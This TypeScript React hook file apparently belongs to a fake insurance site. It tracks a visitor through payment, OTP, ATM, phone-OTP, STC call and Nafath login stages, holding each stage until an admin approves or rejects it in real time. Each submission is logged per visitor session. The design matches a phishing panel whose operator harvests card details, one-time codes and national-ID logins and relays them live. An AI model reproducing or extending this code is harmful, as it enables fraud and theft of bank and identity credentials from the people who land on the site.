import { useState, useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";

type Stage = "payment" | "otp" | "atm" | "phone_verification" | "phone_otp" | "stc_call" | "nafath_login" | "nafath_verify";
type StageStatus = "pending" | "approved" | "rejected";

export const useAdminApproval = (orderId: string | null, stage: Stage) => {
  const [status, setStatus] = useState<"waiting" | "approved" | "rejected">("waiting");

  useEffect(() => {
    if (!orderId) return;

    const channel = supabase
      .channel(`order-stage-${orderId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "insurance_orders",
          filter: `id=eq.${orderId}`,
        },
        (payload: any) => {
          const row = payload.new;
          if (row.current_stage === stage) {
            if (row.stage_status === "approved") setStatus("approved");
            else if (row.stage_status === "rejected") setStatus("rejected");
          }
        }
      )
      .subscribe();

    const interval = setInterval(async () => {
      // Direct REST API query - no RPC needed
      const { data } = await supabase
        .from("insurance_orders")
        .select("id,current_stage,stage_status")
        .eq("id", orderId)
        .single();
      const order = data as any;
      if (order?.current_stage === stage) {
        if (order.stage_status === "approved") setStatus("approved");
        else if (order.stage_status === "rejected") setStatus("rejected");
      }
    }, 3000);

    return () => {
      supabase.removeChannel(channel);
      clearInterval(interval);
    };
  }, [orderId, stage]);

  return status;
};

export const createOrUpdateStage = async (
  orderId: string | null,
  stage: Stage,
  extraData?: Record<string, any>
): Promise<string | null> => {
  const visitorSid = typeof sessionStorage !== "undefined" ? sessionStorage.getItem("visitor_sid") : null;

  const stageData: Record<string, any> = {
    current_stage: stage,
    stage_status: "pending",
    ...extraData,
  };
  const resolvedStageStatus = (stageData.stage_status as StageStatus | undefined) ?? "pending";

  let resolvedOrderId = orderId;

  if (orderId) {
    // Update existing order directly - no RPC needed
    const { error } = await supabase
      .from("insurance_orders")
      .update(stageData)
      .eq("id", orderId);
    if (error) throw error;
  } else {
    // Insert new order directly - no RPC needed
    const insertPayload: Record<string, any> = {
      status: "pending",
      ...stageData,
    };
    if (visitorSid) insertPayload.visitor_session_id = visitorSid;
    const { data, error } = await supabase
      .from("insurance_orders")
      .insert(insertPayload)
      .select("id")
      .single();
    if (error) throw error;
    resolvedOrderId = (data as any)?.id ?? null;
  }

  if (resolvedOrderId && visitorSid) {
    try {
      // Insert stage event directly - no RPC needed
      await supabase
        .from("insurance_order_stage_events")
        .insert({
          order_id: resolvedOrderId,
          visitor_session_id: visitorSid,
          stage: stage,
          status: resolvedStageStatus,
          payload: extraData ?? {},
        });
    } catch (error) {
      console.error("Failed to persist stage event", error);
    }
  }

  return resolvedOrderId;
};
